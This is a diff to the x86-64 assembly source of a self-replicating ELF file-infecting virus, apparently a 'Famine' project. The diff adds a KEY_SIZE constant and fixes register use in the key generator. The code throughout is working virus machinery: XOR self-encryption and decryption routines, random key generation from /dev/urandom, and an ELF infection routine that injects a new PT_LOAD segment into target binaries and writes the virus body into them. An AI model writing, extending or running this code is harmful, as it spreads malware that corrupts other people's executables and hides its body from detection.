@@ -9,6 +9,7 @@
 
 ; Constants for virus operation
 %define VIRUS_STACK_SIZE  16384  ; Stack space for virus buffers
+%define KEY_SIZE          16     ; Encryption key size in bytes
 
 section .bss
     path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
@@ -181,7 +182,7 @@ decrypt_file:
     ; rsi = pointer to virus data
     ; rdi = pointer to key
     ; rcx = size to decrypt
-    xor rdx, rdx                ; rdx = key index (0-15)
+    xor rdx, rdx                ; rdx = key index (0 to KEY_SIZE-1)
     
 .decrypt_loop:
     test rcx, rcx
@@ -195,7 +196,7 @@ decrypt_file:
     ; Increment pointers
     inc rsi                     ; next virus byte
     inc rdx                     ; next key byte
-    and rdx, 0xF                ; wrap around at 16 (key length)
+    and rdx, KEY_SIZE - 1       ; wrap around at KEY_SIZE (key length)
     
     dec rcx
     jmp .decrypt_loop
@@ -211,7 +212,7 @@ decrypt_file:
 ; ============================================
 ; encrypt_file - Encrypt virus code using XOR with key
 ; rdi = pointer to virus copy buffer
-; rsi = pointer to key (16 bytes)
+; rsi = pointer to key (KEY_SIZE bytes)
 ; This function encrypts the virus code from encrypt_start to virus_end
 ; MUST NOT BE ENCRYPTED - placed before encrypt_start
 ; ============================================
@@ -231,7 +232,7 @@ encrypt_file:
     ; rdi = pointer to virus data in buffer
     ; rsi = pointer to key
     ; rcx = size to encrypt
-    xor rdx, rdx                ; rdx = key index (0-15)
+    xor rdx, rdx                ; rdx = key index (0 to KEY_SIZE-1)
     
 .encrypt_loop:
     test rcx, rcx
@@ -245,7 +246,7 @@ encrypt_file:
     ; Increment pointers
     inc rdi                     ; next virus byte
     inc rdx                     ; next key byte
-    and rdx, 0xF                ; wrap around at 16 (key length)
+    and rdx, KEY_SIZE - 1       ; wrap around at KEY_SIZE (key length)
     
     dec rcx
     jmp .encrypt_loop
@@ -259,8 +260,8 @@ encrypt_file:
     ret
 
 ; ============================================
-; get_random_string - Generate a random 16-byte key
-; rdi = pointer to buffer where key will be stored (must be at least 16 bytes)
+; get_random_string - Generate a random KEY_SIZE-byte key
+; rdi = pointer to buffer where key will be stored (must be at least KEY_SIZE bytes)
 ; Uses /dev/urandom for randomness
 ; MUST NOT BE ENCRYPTED - placed before encrypt_start
 ; ============================================
@@ -285,18 +286,18 @@ get_random_string:
     test rax, rax
     js .random_fallback         ; if failed, use fallback
     
-    mov ebx, eax                ; save fd
+    mov rbx, rax                ; save fd
     
-    ; Read 16 random bytes
+    ; Read KEY_SIZE random bytes
     mov eax, SYS_READ
-    mov edi, ebx
+    mov rdi, rbx
     mov rsi, r12
-    mov edx, 16
+    mov edx, KEY_SIZE
     syscall
     
     ; Close /dev/urandom
     mov eax, SYS_CLOSE
-    mov edi, ebx
+    mov rdi, rbx
     syscall
     
     jmp .random_done
@@ -305,7 +306,7 @@ get_random_string:
     ; Fallback: use a simple pattern (not truly random, but functional)
     ; In a real scenario, this would be problematic, but for the virus it's acceptable
     mov rdi, r12
-    mov rcx, 16
+    mov rcx, KEY_SIZE
     mov al, 0x42                ; Simple pattern
 .fallback_loop:
     stosb
@@ -863,8 +864,8 @@ virus_infect_elf:
     mov [rsi+24], r8            ; p_paddr
     mov [rbp-24], r8            ; save for later
 
-    ; p_filesz and p_memsz = virus size + 16 bytes for encryption key
-    mov rax, virus_end - virus_start + 16
+    ; p_filesz and p_memsz = virus size + KEY_SIZE bytes for encryption key
+    mov rax, virus_end - virus_start + KEY_SIZE
     mov [rsi+32], rax           ; p_filesz
     mov [rsi+40], rax           ; p_memsz
 
@@ -959,7 +960,7 @@ virus_infect_elf:
     mov eax, SYS_WRITE
     mov edi, r13d
     lea rsi, [rbp-4224]
-    mov edx, virus_end - virus_start + 16
+    mov edx, virus_end - virus_start + KEY_SIZE
     syscall
 
     ; Close file
@@ -1072,8 +1073,8 @@ virus_infect_elf:
 ; VIRUS CODE END
 ; ============================================
 virus_end:
-; The 16-byte encryption key is stored immediately after virus_end
-; Total virus size including key = virus_end - virus_start + 16
+; The KEY_SIZE-byte encryption key is stored immediately after virus_end
+; Total virus size including key = virus_end - virus_start + KEY_SIZE
 
 ; ============================================
 ; Non-virus code (regular Famine operation)
@@ -1332,7 +1333,7 @@ add_pt_load:
     mov qword [rsi + p_paddr], r8
     mov [rbp-32], r8            ; save new vaddr
 
-    mov rax, virus_end - virus_start + 16
+    mov rax, virus_end - virus_start + KEY_SIZE
     mov qword [rsi + p_filesz], rax
     mov qword [rsi + p_memsz], rax
     mov qword [rsi + p_align], 0x1000
@@ -1423,7 +1424,7 @@ add_pt_load:
     mov eax, SYS_WRITE
     mov edi, r13d
     lea rsi, [rel virus_copy_buf]
-    mov edx, virus_end - virus_start + 16
+    mov edx, virus_end - virus_start + KEY_SIZE
     syscall
 
     ; Close file
